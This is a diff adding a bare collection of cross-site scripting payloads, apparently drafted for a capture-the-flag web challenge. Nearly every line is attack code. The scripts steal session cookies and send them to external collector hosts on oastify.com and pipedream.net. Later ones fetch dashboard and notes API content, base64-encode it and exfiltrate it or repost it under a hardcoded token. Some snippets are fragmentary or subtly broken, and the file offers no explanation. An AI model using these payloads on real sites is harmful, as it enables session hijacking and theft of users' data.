@@ -1,0 +1,96 @@
+<h1>pwned</h1><script>const xhr = new XMLHttpRequest();xhr.open('GET', 'https://nqh2pa1mewyzr4f0839a4eq6dxjo7gz4o.oastify.com/?c='+document.cookie, true);xhr.send();</script>
+
+<h1>pwned</h1><script>const xhr = new XMLHttpRequest();xhr.open('GET', 'https://nqh2pa1mewyzr4f0839a4eq6dxjo7gz4o.oastify.com/?c='+document.cookie, true);xhr.setRequestHeader('Content-Type', 'text/plain;charset=utf-8'); xhr.send();</script>
+
+<h1>pwned</h1><script>const xhr2 = new XMLHttpRequest();xhr2.open('POST', 'https://nqh2pa1mewyzr4f0839a4eq6dxjo7gz4o.oastify.com/?c='+document.cookie, true);xhr2.setRequestHeader('Content-Type', 'text/plain;charset=utf-8'); xhr2.send(document.cookie);</script>
+
+<h1>pwned</h1><img src=x onerror=fetch('v62a5ihuu4e77cv8obpikm6et5zwnohc6.oastify.com/?c='.concat(document.cookie)) />
+
+<h1>pwned</h1><img src=x onerror=alert(document.cookie) />
+
+<h1>pwned</h1><script>const xhr = new XMLHttpRequest();xhr.open('GET', 'https://enlfg657jrgdt6s.m.pipedream.net/?c='+document.cookie, true);xhr.setRequestHeader('Content-Type', 'text/plain;charset=utf-8'); xhr.send();</script><img src=x onerror=fetch('https://enlfg657jrgdt6s.m.pipedream.net/image?c='.concat(document.cookie)) />
+
+<h1>pwned</h1><script>const xhr2 = new XMLHttpRequest();xhr2.open('POST', 'https://enlfg657jrgdt6s.m.pipedream.net/ctf?c='+document.cookie, true);xhr2.setRequestHeader('Content-Type', 'text/plain;charset=utf-8'); xhr2.send(document.cookie);</script><img src=x onerror=fetch('https://enlfg657jrgdt6s.m.pipedream.net/image2?c='.concat(document.cookie)) />
+
+
+<script>const cc="https://enlfg657jrgdt6s.m.pipedream.net/?c=";const url="";const xhr = new XMLHttpRequest();xhr.open('POST', url, true);xhr.setRequestHeader('Content-Type', 'text/plain;charset=utf-8'); xhr.send(document.cookie);</script>
+
+    const text = await res.text();
+    let b64 = btoa(unescape(encodeURIComponent(text)));
+    b64 = b64.replace(/\r?\n|\r/g, ""); // ensure single line
+
+    // Create textarea inline
+    const ta = document.createElement("textarea");
+    ta.style.width = "100%";
+    ta.style.height = "300px";
+    ta.value = b64;
+    document.body.appendChild(ta);
+
+    console.log("Base64 done for:", url);
+  } catch (err) {
+    console.error("fetchAndBase64 error:", err);
+  }
+}
+</script>
+
+
+<script>
+function fetchAndBase64(url) {
+    const res = fetch(url);
+    const text = res.text();
+    let b64 = btoa(unescape(encodeURIComponent(text)));
+    return b64;
+}
+const payload=fetchAndBase64("/dashboard");
+const cc="https://enlfg657jrgdt6s.m.pipedream.net/?c=";
+const xhr = new XMLHttpRequest();
+xhr.open('POST', cc, true);
+xhr.setRequestHeader('Content-Type', 'text/plain;charset=utf-8'); 
+xhr.send(payload);
+</script>
+
+
+<script>
+async function fetchAndBase64(url) {
+    const res = await fetch(url);
+    const text = await res.text();
+    return btoa(unescape(encodeURIComponent(text)));
+}
+
+(async () => {
+    const payload = await fetchAndBase64("/api/notes/");
+    const nextNote = "/api/notes";
+    const token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2OGNmNGFiNTBiY2U0OTIyYTQ3YTdmMDAiLCJpYXQiOjE3NTg0MTU1NDcsImV4cCI6MTc1ODQxOTE0N30.RanN5i";
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', nextNote, true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded;charset=UTF-8'); 
+    xhr.setRequestHeader('Cookie', 'token='+token); 
+    xhr.send("title=fromAdmin&content=" + payload);
+})();
+</script>
+
+
+
+<script>
+(async () => {
+  try {
+    // Step 1: fetch the list of notes
+    const res = await fetch("http://localhost:8000/api/notes", { credentials: "include" });
+    const notes = await res.json(); // [{"_id":"uuid","title":"...","content":"..."}]
+
+    // Step 2: collect all IDs
+    const ids = notes.map(n => n._id);
+    console.log("Found IDs:", ids);
+
+    // Step 3: fetch each note individually
+    for (const id of ids) {
+      const url = "https://enlfg657jrgdt6s.m.pipedream.net/?c=" + encodeURIComponent(id);
+      const noteRes = await fetch(url, { credentials: "include" });
+      const note = await noteRes.json();
+      console.log("Note", id, note);
+    }
+  } catch (err) {
+    console.error("Error fetching notes:", err);
+  }
+})();
+</script>
